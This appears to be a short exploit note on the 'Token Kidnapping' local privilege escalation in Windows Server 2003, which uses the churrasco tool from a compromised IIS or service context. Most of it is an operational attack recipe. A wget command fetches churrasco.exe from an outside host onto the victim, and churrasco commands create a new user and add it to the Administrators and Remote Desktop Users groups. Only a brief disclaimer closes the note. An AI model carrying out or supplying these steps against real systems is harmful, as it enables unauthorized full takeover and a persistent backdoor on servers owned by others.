Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation

An oldie but goldie.

Basically if you can run code under any service in Win2k3 then you can own Windows, this is because Windows 
services accounts can impersonate.  Other process (not services) that can impersonate are IIS 6 worker processes 
so if you can run code from an ASP .NET or classic ASP web application then you can own Windows too. If you provide 
shared hosting services then I would recomend to not allow users to run this kind of code from ASP.

It is worth noting that churrasco needs to be transferred onto the compromised machine first. 
Example:
wget http://10.10.10.10/churrasco.exe -o churrasco.exe

Once on the system, execute it:
c:\Inetpub> churrasco
 
The output should be something like this:
 /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

Here are some examples on what you can do with churrasco:
 c:\Inetpub>churrasco -d "net user /add <username> <password>"
 c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
 c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
 
 Play nice and do not use this for illegal purposes.
